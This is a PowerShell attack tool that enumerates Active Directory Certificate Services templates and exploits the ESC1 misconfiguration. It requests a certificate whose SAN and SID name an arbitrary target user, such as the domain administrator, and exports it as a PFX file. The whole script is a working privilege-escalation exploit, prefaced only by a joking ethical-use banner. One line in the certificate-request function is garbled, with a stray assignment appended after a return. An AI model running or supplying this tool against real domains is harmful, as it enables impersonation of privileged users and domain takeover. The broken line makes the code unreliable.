#requires -Version 5.1
[CmdletBinding()]
param (
    [Parameter(Mandatory = $true)]
    [ValidateSet('enum', 'exploit')]
    [string]$Mode,

    [Parameter(Mandatory = $false)]
    [string]$TemplateName,

    [Parameter(Mandatory = $false)]
    [string]$OutputPath = 'cert.pfx',

    [Parameter(Mandatory = $false)]
    [string]$TargetUserSAN
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

#region UI Helpers
function Write-Banner {
    param([string]$Mode)

    $line = '═' * 70
    Write-Host "`n╔$line╗" -ForegroundColor DarkCyan
    Write-Host ('║' + (' LOLesc1! Enum and exploit ADCS with PowerShell. '.PadLeft(39).PadRight(70)) + '║') -ForegroundColor Cyan
    Write-Host "╠$line╣" -ForegroundColor DarkCyan
    Write-Host ('║ Mode: ' + $Mode.PadRight(62) + ' ║') -ForegroundColor Gray
    Write-Host "╚$line╝`n" -ForegroundColor DarkCyan
    Write-Host 'Written by Harrison Wells' -ForegroundColor DarkGray
}

function Write-Info { param([string]$Message) Write-Host "[i] $Message" -ForegroundColor Cyan }
function Write-Good { param([string]$Message) Write-Host "[+] $Message" -ForegroundColor Green }
function Write-Warn { param([string]$Message) Write-Host "[!] $Message" -ForegroundColor Yellow }
function Write-Err  { param([string]$Message) Write-Host "[-] $Message" -ForegroundColor Red }

function Show-Disclaimer {
    Write-Host "⚠ ETHICAL USE WARNING" -ForegroundColor Yellow
    Write-Host "THIS SCRIPT IS INTENDED FOR ETHICAL USE ONLY (NO FEDS ALLOWED!!!!!!)" -ForegroundColor Yellow
}
#endregion

#region LDAP Helpers
function Get-RootDSE {
    return [ADSI]'LDAP://RootDSE'
}

function Get-LdapSearcher {
    param(
        [Parameter(Mandatory = $true)] [string]$BaseDn,
        [Parameter(Mandatory = $true)] [string]$Filter,
        [string[]]$Properties = @(),
        [int]$PageSize = 1000,
        [string]$Server,
        [System.Management.Automation.PSCredential]$Credential
    )

    $ldapPrefix = if ([string]::IsNullOrWhiteSpace($Server)) { 'LDAP://' } else { "LDAP://$Server/" }
    $ldapPath = "$ldapPrefix$BaseDn"

    $entry = if ($Credential) {
        New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
    }
    else {
        New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
    }
    
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
    $searcher.Filter = $Filter
    $searcher.PageSize = $PageSize
    foreach ($p in $Properties) { [void]$searcher.PropertiesToLoad.Add($p) }
    return $searcher
}

function Get-CurrentIdentitySids {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $sidSet = New-Object 'System.Collections.Generic.HashSet[string]'
    [void]$sidSet.Add($identity.User.Value)
    foreach ($groupSid in $identity.Groups) {
        try { [void]$sidSet.Add($groupSid.Value) } catch { }
    }
    return $sidSet
}

function Convert-ObjectSidToString {
    param([byte[]]$SidBytes)
    if (-not $SidBytes) { return $null }
    $sidObj = New-Object System.Security.Principal.SecurityIdentifier($SidBytes, 0)
    return $sidObj.Value
}

function Test-TemplateEnrollmentRight {
    param(
        [Parameter(Mandatory = $true)] [byte[]]$NTSecurityDescriptor,
        [Parameter(Mandatory = $true)] [System.Collections.Generic.HashSet[string]]$PrincipalSids
    )

    $enrollGuid = [Guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55' # Certificate-Enrollment extended right
    $autoEnrollGuid = [Guid]'a05b8cc2-17bc-4802-a710-e7c15ab866a2' # Certificate-AutoEnrollment extended right

    $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
    $sd.SetSecurityDescriptorBinaryForm($NTSecurityDescriptor)
    $rules = $sd.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])

    foreach ($rule in $rules) {
        if ($rule.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) { continue }
        $sid = $rule.IdentityReference.Value
        if (-not $PrincipalSids.Contains($sid)) { continue }

        if (($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight) -ne 0) {
            if (-not $rule.ObjectType -or $rule.ObjectType -eq [Guid]::Empty -or $rule.ObjectType -eq $enrollGuid -or $rule.ObjectType -eq $autoEnrollGuid) {
                return $true
            }
        }
    }

    return $false
}

function Test-TemplateAuthenticationCapable {
    param([string[]]$ExtendedKeyUsageOids)

    # No EKUs on a template can indicate "any purpose" semantics.
    if (-not $ExtendedKeyUsageOids -or $ExtendedKeyUsageOids.Count -eq 0) {
        return $true
    }

    $authEkuOids = @(
        '1.3.6.1.5.5.7.3.2',       # Client Authentication
        '1.3.6.1.4.1.311.20.2.2',  # Smart Card Logon
        '1.3.6.1.5.2.3.4',         # PKINIT Client Authentication
        '2.5.29.37.0'              # Any Purpose
    )

    foreach ($eku in $ExtendedKeyUsageOids) {
        if ($authEkuOids -contains $eku) { return $true }
    }

    return $false
}
#endregion

function Get-ADCSConfig {
    [CmdletBinding()]
    param (
        [string]$LdapServer,
        [System.Management.Automation.PSCredential]$LdapCredential,
        [switch]$SkipLdapFallbackPrompt
    )

    $configDn = $null
    $effectiveLdapServer = $LdapServer
    $effectiveLdapCredential = $LdapCredential

    try {
        Write-Info 'Querying LDAP RootDSE...'
        $rootDsePath = if ([string]::IsNullOrWhiteSpace($effectiveLdapServer)) { 'LDAP://RootDSE' } else { "LDAP://$effectiveLdapServer/RootDSE" }
        $rootDse = if ($effectiveLdapCredential) {
            New-Object System.DirectoryServices.DirectoryEntry($rootDsePath, $effectiveLdapCredential.UserName, $effectiveLdapCredential.GetNetworkCredential().Password)
        }
        else {
            New-Object System.DirectoryServices.DirectoryEntry($rootDsePath)
        }

        $configDn = [string]$rootDse.configurationNamingContext
        if (-not $configDn) {
            throw 'Unable to read configurationNamingContext from RootDSE.'
        }
    }
    catch {
        if ($SkipLdapFallbackPrompt) { throw }

        Write-Warn 'Failed to query LDAP with the current user context.'
        Write-Warn "LDAP error: $($_.Exception.Message)"
        Write-Info 'Provide alternate LDAP bind details for non-domain-joined execution.'

        $bindUsername = Read-Host 'LDAP username (DOMAIN\user or user@domain)'
        $bindPassword = Read-Host -AsSecureString 'LDAP password'
        $bindDomain = Read-Host 'AD domain FQDN (example: corp.local)'
        $bindDcIp = Read-Host 'Domain controller IP or hostname'

        if ([string]::IsNullOrWhiteSpace($bindUsername) -or [string]::IsNullOrWhiteSpace($bindDomain) -or [string]::IsNullOrWhiteSpace($bindDcIp)) {
            throw 'Username, domain, and domain controller are required for LDAP fallback authentication.'
        }

        $effectiveLdapCredential = New-Object System.Management.Automation.PSCredential($bindUsername, $bindPassword)
        $effectiveLdapServer = $bindDcIp
        $configDn = "DC=$($bindDomain -replace '\.', ',DC=')"

        Write-Info "Retrying LDAP queries via explicit server '$effectiveLdapServer' and provided credentials."
    }

    $principalSids = Get-CurrentIdentitySids

    # Enumerate Enterprise CAs (Enrollment Services objects)
    $caBase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDn"
    Write-Info "Searching for Enterprise CAs under: $caBase"
    $caSearcher = Get-LdapSearcher -BaseDn $caBase -Filter '(objectClass=pKIEnrollmentService)' -Properties @('cn', 'name', 'dNSHostName', 'certificateTemplates', 'distinguishedName') -Server $effectiveLdapServer -Credential $effectiveLdapCredential
    $caResults = $caSearcher.FindAll()

    $cas = @()
    foreach ($result in $caResults) {
        $p = $result.Properties
        $cas += [PSCustomObject]@{
            Name = if ($p['name'].Count) { [string]$p['name'][0] } else { [string]$p['cn'][0] }
            DNSHostName = if ($p['dnshostname'].Count) { [string]$p['dnshostname'][0] } else { $null }
            DistinguishedName = if ($p['distinguishedname'].Count) { [string]$p['distinguishedname'][0] } else { $null }
            PublishedTemplates = @($p['certificatetemplates'] | ForEach-Object { [string]$_ })
        }
    }

    # Enumerate templates
    $templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDn"
    Write-Info "Searching for certificate templates under: $templateBase"
    $templateSearcher = Get-LdapSearcher -BaseDn $templateBase -Filter '(objectClass=pKICertificateTemplate)' -Properties @(
        'cn',
        'displayName',
        'msPKI-Certificate-Name-Flag',
        'msPKI-Enrollment-Flag',
        'msPKI-Private-Key-Flag',
        'msPKI-RA-Signature',
        'nTSecurityDescriptor',
        'distinguishedName',
        'pKIExtendedKeyUsage'
    ) -Server $effectiveLdapServer -Credential $effectiveLdapCredential

    # Request DACL in security descriptor
    $templateSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
    $templateResults = $templateSearcher.FindAll()

    $templates = @()
    foreach ($result in $templateResults) {
        $p = $result.Properties
        $name = if ($p['cn'].Count) { [string]$p['cn'][0] } else { $null }
        $displayName = if ($p['displayname'].Count) { [string]$p['displayname'][0] } else { $name }

        $certNameFlags = if ($p['mspki-certificate-name-flag'].Count) { [int]$p['mspki-certificate-name-flag'][0] } else { 0 }
        $enrollFlags = if ($p['mspki-enrollment-flag'].Count) { [int]$p['mspki-enrollment-flag'][0] } else { 0 }
        $authorizedSignatureCount = if ($p['mspki-ra-signature'].Count) { [int]$p['mspki-ra-signature'][0] } else { 0 }
        $privFlags = if ($p['mspki-private-key-flag'].Count) { [int]$p['mspki-private-key-flag'][0] } else { 0 }

        $enrolleeSuppliesSubject = (($certNameFlags -band 0x1) -eq 0x1)
        $noManagerApproval = (($enrollFlags -band 0x2) -eq 0)
        $noAuthorizedSignatures = ($authorizedSignatureCount -eq 0)
        $exportableKey = (($privFlags -band 0x10) -eq 0x10) -or (($privFlags -band 0x1) -eq 0x1)

        $ntsd = $null
        if ($p['ntsecuritydescriptor'].Count) { $ntsd = [byte[]]$p['ntsecuritydescriptor'][0] }
        $enrollmentRights = $false
        if ($ntsd) {
            $enrollmentRights = Test-TemplateEnrollmentRight -NTSecurityDescriptor $ntsd -PrincipalSids $principalSids
        }
        $ekuOids = @($p['pkiextendedkeyusage'] | ForEach-Object { [string]$_ })
        $authenticationCapable = Test-TemplateAuthenticationCapable -ExtendedKeyUsageOids $ekuOids

        # Check if template is published by at least one discovered CA
        $isPublished = $false
        $publishedBy = @()
        foreach ($ca in $cas) {
            if ($ca.PublishedTemplates -contains $name) {
                $isPublished = $true
                $publishedBy += "$($ca.DNSHostName)\$($ca.Name)"
            }
        }

        $templates += [PSCustomObject]@{
            Name = $name
            DisplayName = $displayName
            CertificateNameFlags = $certNameFlags
            EnrollmentFlags = $enrollFlags
            AuthorizedSignatureCount = $authorizedSignatureCount
            PrivateKeyFlags = $privFlags
            EnrolleeSuppliesSubject = $enrolleeSuppliesSubject
            NoManagerApproval = $noManagerApproval
            NoAuthorizedSignatures = $noAuthorizedSignatures
            ExportableKey = $exportableKey
            EnrollmentRights = $enrollmentRights
            AuthenticationCapable = $authenticationCapable
            EKUs = $ekuOids
            Published = $isPublished
            PublishedBy = $publishedBy
        }
    }

    $exploitable = $templates | Where-Object {
        $_.EnrolleeSuppliesSubject -and
        $_.NoManagerApproval -and
        $_.NoAuthorizedSignatures -and
        $_.EnrollmentRights -and
        $_.AuthenticationCapable -and
        $_.Published
    }

    return [PSCustomObject]@{
        CAs = $cas
        Templates = $templates
        ExploitableTemplates = @($exploitable)
        LdapServer = $effectiveLdapServer
        LdapCredential = $effectiveLdapCredential
    }
}


function Resolve-TargetUserSid {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)] [string]$Identity,
        [string]$LdapServer,
        [System.Management.Automation.PSCredential]$LdapCredential
    )

    if ([string]::IsNullOrWhiteSpace($Identity)) {
        throw 'Target user identity cannot be empty when resolving SID.'
    }

    $rootDsePath = if ([string]::IsNullOrWhiteSpace($LdapServer)) { 'LDAP://RootDSE' } else { "LDAP://$LdapServer/RootDSE" }
    $rootDse = if ($LdapCredential) {
        New-Object System.DirectoryServices.DirectoryEntry($rootDsePath, $LdapCredential.UserName, $LdapCredential.GetNetworkCredential().Password)
    }
    else {
        New-Object System.DirectoryServices.DirectoryEntry($rootDsePath)
    }

    $defaultNamingContext = [string]$rootDse.defaultNamingContext
    if (-not $defaultNamingContext) {
        throw 'Unable to resolve defaultNamingContext from RootDSE for SID lookup.'
    }

    $escapedIdentity = $Identity.Replace('\', '\5c').Replace('*', '\2a').Replace('(', '\28').Replace(')', '\29')
    if ($escapedIdentity -like '*@*') {
        $filter = "(&(objectClass=user)(userPrincipalName=$escapedIdentity))"
    }
    else {
        $filter = "(&(objectClass=user)(|(sAMAccountName=$escapedIdentity)(cn=$escapedIdentity)))"
    }

    $searcher = Get-LdapSearcher -BaseDn $defaultNamingContext -Filter $filter -Properties @('objectSid', 'distinguishedName', 'userPrincipalName', 'sAMAccountName') -Server $LdapServer -Credential $LdapCredential
    $result = $searcher.FindOne()
    if (-not $result) {
        throw "Could not resolve a unique AD user object for '$Identity'."
    }

    $sidBytes = if ($result.Properties['objectsid'].Count) { [byte[]]$result.Properties['objectsid'][0] } else { $null }
    $sid = Convert-ObjectSidToString -SidBytes $sidBytes
    if (-not $sid) {
        throw "Resolved user '$Identity' but objectSid was missing."
    }

    return $sid
}

function New-CertRequestInf {
    param(
        [Parameter(Mandatory = $true)] [string]$TemplateName,
        [Parameter(Mandatory = $true)] [string]$TargetSan,
        [string]$TargetSid
    )

    $infTemplate = @'
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN={1}"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 1
RequestType = PKCS10
HashAlgorithm = SHA256
KeyUsage = 0xa0

[Extensions]
2.5.29.17 = "{{text}}"
_continue_ = "upn={1}"
{3}

[RequestAttributes]
CertificateTemplate = {0}
'@

    $sidLine = if ([string]::IsNullOrWhiteSpace($TargetSid)) { '' } else { '_continue_ = "URL=tag:microsoft.com,2022-09-14:sid:{2}"' }

    return ($infTemplate -f $TemplateName, $TargetSan, $TargetSid, $sidLine)$targetSidValue = Resolve-TargetUserSid -Identity $targetSanValue -LdapServer $Config.LdapServer -LdapCredential $Config.LdapCredential
}

function Invoke-ESC1Exploitation {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)] [pscustomobject]$Config,
        [Parameter(Mandatory = $true)] [string]$TemplateName,
        [Parameter(Mandatory = $true)] [string]$OutputPath,
        [string]$TargetUserSAN
    )

    $template = $Config.ExploitableTemplates | Where-Object { $_.Name -eq $TemplateName -or $_.DisplayName -eq $TemplateName } | Select-Object -First 1
    if (-not $template) {
        throw "Template '$TemplateName' is not in exploitable set (or does not exist/published)."
    }

    $selectedCa = $null
    foreach ($caConfig in $template.PublishedBy) {
        $selectedCa = $caConfig
        break
    }
    if (-not $selectedCa) {
        if ($Config.CAs.Count -eq 0) { throw 'No CA discovered in LDAP.' }
        $selectedCa = "$($Config.CAs[0].DNSHostName)\$($Config.CAs[0].Name)"
    }

    $targetSanValue = $TargetUserSAN
    $targetSidValue = Resolve-TargetUserSid -Identity $targetSanValue -LdapServer $Config.LdapServer -LdapCredential $Config.LdapCredential
    
    Write-Info "Using template: $($template.Name)"
    Write-Info "Using CA: $selectedCa"
    Write-Info "Target SAN/UPN: $targetSanValue"
    Write-Info "Resolved target SID: $targetSidValue"

       if (-not (Get-Command certreq.exe -ErrorAction SilentlyContinue)) {
        throw 'certreq.exe was not found in PATH. This script must be run on Windows with Certificate Services tools available.'
    }

    $outputDirectory = Split-Path -Parent $OutputPath
    if (-not [string]::IsNullOrWhiteSpace($outputDirectory) -and -not (Test-Path -LiteralPath $outputDirectory)) {
        [void](New-Item -ItemType Directory -Path $outputDirectory -Force)
    }

    $tempTag = [Guid]::NewGuid().ToString('N')
    $infPath = Join-Path $env:TEMP "$($template.Name)-$tempTag.inf"
    $reqPath = Join-Path $env:TEMP "$($template.Name)-$tempTag.req"
    $cerPath = Join-Path $env:TEMP "$($template.Name)-$tempTag.cer"

    try {
        $inf = New-CertRequestInf -TemplateName $template.Name -TargetSan $targetSanValue -TargetSid $targetSidValue
        $inf | Out-File -FilePath $infPath -Encoding ASCII
        Write-Good "Request INF created: $infPath"

        $newOut = & certreq.exe -new $infPath $reqPath 2>&1
        if ($LASTEXITCODE -ne 0) { throw "certreq -new failed: $($newOut -join ' ')" }
        Write-Good "CSR generated: $reqPath"

        $submitOut = & certreq.exe -submit -config $selectedCa $reqPath $cerPath 2>&1
        if ($LASTEXITCODE -ne 0) { throw "certreq -submit failed: $($submitOut -join ' ')" }
        Write-Good 'Request submitted to CA.'

        # If issued immediately, .cer is typically created by -submit; if pending, try retrieve via request ID
        if (-not (Test-Path $cerPath)) {
            $requestId = $null
            foreach ($line in $submitOut) {
                if ($line -match '(?i)request\s*id\s*[:=]\s*(\d+)') {
                    $requestId = $matches[1]
                    break
                }
            }

            if (-not $requestId) { throw 'Could not determine Request ID and no certificate file was produced (possibly pending/manual approval).' }

            Write-Info "Attempting retrieval for Request ID $requestId"
            $retrieveOut = & certreq.exe -retrieve -config $selectedCa $requestId $cerPath 2>&1
            if ($LASTEXITCODE -ne 0) { throw "certreq -retrieve failed: $($retrieveOut -join ' ')" }
        }

        $acceptOut = & certreq.exe -accept $cerPath 2>&1
        if ($LASTEXITCODE -ne 0) { throw "certreq -accept failed: $($acceptOut -join ' ')" }
        Write-Good 'Certificate accepted into CurrentUser store.'

        $issuerName = $selectedCa.Split('\')[-1]
        $candidates = @(Get-ChildItem Cert:\CurrentUser\My | Where-Object {
            $_.Issuer -like "*CN=$issuerName*" -and ($_.Subject -like "*CN=$targetSanValue*" -or $_.Subject -like "*$targetSanValue*")
        } | Sort-Object NotBefore -Descending)

        if (-not $candidates -or $candidates.Count -eq 0) {
            throw 'Certificate accepted but matching certificate not found in CurrentUser\My.'
        }

        $cert = $candidates[0]

        Write-Host ''
        $secure = Read-Host -AsSecureString 'Enter PFX password (leave blank for an empty password)'

        # SecureString.Length can throw in some hosts, so convert carefully
        $secureBstr = [Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode($secure)
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringUni($secureBstr)
        try {
            if ([string]::IsNullOrEmpty($plain)) {
                $empty = ConvertTo-SecureString -String '' -AsPlainText -Force
                $cert | Export-PfxCertificate -FilePath $OutputPath -Password $empty -Force | Out-Null
            } else {
                $cert | Export-PfxCertificate -FilePath $OutputPath -Password $secure -Force | Out-Null
            }
        }
        finally {
            if ($secureBstr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($secureBstr) }
            if ($null -ne $plain) { $plain = $null }
        }

        if (-not (Test-Path $OutputPath)) { throw "PFX export failed: $OutputPath" }
        Write-Good "PFX exported successfully: $OutputPath"
    }
    finally {
        foreach ($f in @($infPath, $reqPath, $cerPath)) {
            if (Test-Path $f) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }
        }
        Write-Info 'Temporary files cleaned up.'
    }
}

# Main
try {
    if ([string]::IsNullOrWhiteSpace($Mode)) {
        $Mode = Read-Host 'Mode (enum/exploit)'
    }
    
    Write-Banner -Mode $Mode
    Show-Disclaimer

    if ($Mode -eq 'exploit') {
        while ([string]::IsNullOrWhiteSpace($TemplateName)) {
            $TemplateName = Read-Host 'TemplateName is required for exploit mode. Enter template name'
        }

        while ([string]::IsNullOrWhiteSpace($TargetUserSAN)) {
            $TargetUserSAN = Read-Host 'Target user UPN/SAN is required for exploit mode (example: administrator@corp.local)'
        }

        if ([string]::IsNullOrWhiteSpace($OutputPath)) {
            $OutputPath = Read-Host 'Output PFX path (default: cert.pfx)'
            if ([string]::IsNullOrWhiteSpace($OutputPath)) { $OutputPath = 'cert.pfx' }
        }
    }
    
    $config = Get-ADCSConfig
    Write-Good "Discovered $($config.CAs.Count) CA(s), $($config.Templates.Count) template(s), $($config.ExploitableTemplates.Count) potentially ESC1-exploitable template(s)."

    if ($Mode -eq 'enum') {
        Write-Host ''
        Write-Host '=== Certification Authorities ===' -ForegroundColor Magenta
        if ($config.CAs.Count -eq 0) {
            Write-Warn 'No Enterprise CAs were discovered in LDAP.'
        } else {
            $config.CAs | Select-Object Name, DNSHostName, @{n='PublishedTemplateCount';e={$_.PublishedTemplates.Count}} | Format-Table -AutoSize
        }

        Write-Host ''
        Write-Host '=== Certificate Templates ===' -ForegroundColor Magenta
        $config.Templates |
            Select-Object Name, EnrolleeSuppliesSubject, NoManagerApproval, EnrollmentRights, AuthenticationCapable, Published, ExportableKey |
            Sort-Object Name |
            Format-Table -AutoSize

        Write-Host ''
        Write-Host '=== Potential ESC1 Templates ===' -ForegroundColor Magenta
        if ($config.ExploitableTemplates.Count -eq 0) {
            Write-Warn 'No templates matched the ESC1 heuristic for the current user context.'
        } else {
            $config.ExploitableTemplates |
                Select-Object Name, DisplayName, EnrollmentRights, Published, @{n='PublishedBy';e={$_.PublishedBy -join '; '}} |
                Format-Table -AutoSize
        }
    }
    elseif ($Mode -eq 'exploit') {
        Invoke-ESC1Exploitation -Config $config -TemplateName $TemplateName -OutputPath $OutputPath -TargetUserSAN $TargetUserSAN
    }
}
catch {
    Write-Err $_.Exception.Message
    exit 1
}
